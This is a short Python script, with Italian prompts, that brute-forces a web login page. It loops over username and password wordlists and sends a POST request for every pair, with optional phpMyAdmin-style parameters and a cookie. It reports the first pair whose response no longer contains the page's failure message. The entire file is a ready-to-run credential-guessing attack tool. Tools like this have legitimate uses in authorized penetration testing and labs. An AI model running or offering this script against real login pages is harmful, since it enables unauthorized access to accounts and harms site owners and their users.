import requests
from seekFile import seekFile

def readFile(text):
	with open(text) as file:
		lines = file.read().splitlines()
	return lines        

username_file = seekFile("usernames.txt")
password_file = seekFile("passwords.txt")
url = input("[~] Inserisci l'URL della pagina di login ==> ")
login_failed_string = input("[~] Inserisci l'errore che esce sulla pagina in caso di tentativo sbagliato ==> ")

username_list = readFile(username_file)
password_list = readFile(password_file)

n_usernames = len(username_list)
n_passwords = len(password_list)

print(f"Ecco i {n_usernames} elementi presenti all'interno del file:\n")
for index,username in enumerate(username_list):
	print(f"[{index + 1}] {username}")
	
input_indice_utente = int(input("\nDa quale USERNAME vuoi iniziare il Bruteforce?  "))
cookie_value = input("\n[Opzionale] Inserisci il cookie ==> ")

i = input_indice_utente - 1

while i < n_usernames:
	username_loop = username_list[i]
	for password in password_list:
		print(f"Test---[Username]={username_loop}  with\t[Password]={password}")
		data = {"username":username_loop,"password":password,"Login":"submit"}
		if cookie_value != "":
			response = requests.post(url, params={"pma_username":username_loop,"pma_password":password,"Go":"submit"}, cookies = {"Cookie":cookie_value})
		else:
			response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print("[+]Username trovato: => " + username_loop)
			print("[+]Password trovata: => " + password)
			exit()
	i += 1


print("[-]ERRORE[-]")
